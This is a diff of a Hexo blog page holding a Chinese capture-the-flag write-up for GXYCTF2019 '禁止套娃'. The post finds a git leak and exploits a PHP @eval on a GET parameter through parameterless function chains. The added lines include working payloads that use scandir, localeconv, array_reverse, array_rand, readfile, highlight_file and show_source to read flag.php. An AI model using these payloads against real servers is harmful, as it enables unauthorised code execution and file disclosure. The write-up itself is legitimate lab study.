@@ -7,7 +7,7 @@
 <meta property="og:locale">
 <meta property="og:image" content="http://daweitech.github.io/img/1.jpg">
 <meta property="article:published_time" content="2021-08-01T07:18:57.000Z">
-<meta property="article:modified_time" content="2021-08-01T12:28:09.561Z">
+<meta property="article:modified_time" content="2021-08-08T01:49:40.805Z">
 <meta property="article:author" content="宛若梦醒月明时">
 <meta property="article:tag" content="buu">
 <meta name="twitter:card" content="summary">
@@ -100,7 +100,7 @@ const getScript = url => new Promise((resolve, reject) => {
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2021-08-01 20:28:09'
+  postUpdate: '2021-08-08 09:49:40'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -166,7 +166,7 @@ if (asideStatus !== undefined) {
      document.documentElement.classList.remove('hide-aside')
    }
 }})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="WHite Hat" type="application/atom+xml">
-</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/87.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">49</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">19</div></a></div></div></div><hr/></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/1.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">WHite Hat</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">GXYCTF2019 禁止套娃</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-08-01T07:18:57.000Z" title="Created 2021-08-01 15:18:57">2021-08-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-08-01T12:28:09.561Z" title="Updated 2021-08-01 20:28:09">2021-08-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>​    靶机启动：</p>
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/87.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">49</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">19</div></a></div></div></div><hr/></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/1.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">WHite Hat</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">GXYCTF2019 禁止套娃</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-08-01T07:18:57.000Z" title="Created 2021-08-01 15:18:57">2021-08-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-08-08T01:49:40.805Z" title="Updated 2021-08-08 09:49:40">2021-08-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>​    靶机启动：</p>
 <p><img src="/2021/08/01/buu/5/image-20210801193338875.png" alt="image-20210801193338875"></p>
 <p>查看了源码无果，又试了一下index.php、robots协议之类的也不行，御剑没有扫描出来</p>
 <p>查看了wp才知道这是git泄露。</p>
@@ -211,9 +211,8 @@ if(isset($_GET['exp'])){
 <li>第二层<code>preg_replace()</code>正则表达式匹配，<code>(?R)</code>表示引用当前表达式，只能匹配通过无参数的函数。</li>
 <li>第三层<code>preg_match()</code>限制了一些关键字</li>
 <li><code>@eval($_GET[&#39;exp&#39;]);</code>可以进行命令执行；典型的无参数RCE</li>
-<li></li>
+<li>虽然其不能使用php伪协议，但是@eval($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录：</li>
 </ul>
-<p>虽然其不能使用php伪协议，但是@eval($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录：</p>
 <p><img src="/2021/08/01/buu/5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>第二层正则表达式无法给directory参数赋值，所以查找能够返回为’.’结果的函数；</p>
 <p>首先需要得到当前目录下的文件<br>scandir()函数可以扫描当前目录下的文件，例如：</p>
@@ -227,8 +226,29 @@ if(isset($_GET['exp'])){
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/08/01/buu/5/image-20210801200909285.png" alt="image-20210801200909285"></p>
-<p>之后的读取暂时无法理解，全都照搬了wp</p>
-<p>有时间再理解消化。</p>
+<p>到这里我们也只是可以知道flag.php的存在</p>
+<p>却还不能读取它的源码</p>
+<p><img src="/2021/08/01/buu/5/1625650-20200204202458447-503722062.png" alt="img"></p>
+<p>从上图的官方解释中可以知道</p>
+<p>我们无法用单独的函数读取源码</p>
+<p><strong>1.array_reverse()</strong><br>以相反的元素顺序返回数组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_reverse(scandir(current(localeconv()))));</span><br><span class="line">2.array_rand(array_flip())</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.array_flip()</strong></p>
+<p>交换数组的键和值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_flip(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.array_rand()</strong></p>
+<p>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;print_r(readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
 <p><img src="/2021/08/01/buu/5/image-20210801202551668.png" alt="image-20210801202551668"></p>
 <p>参考博客：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p>
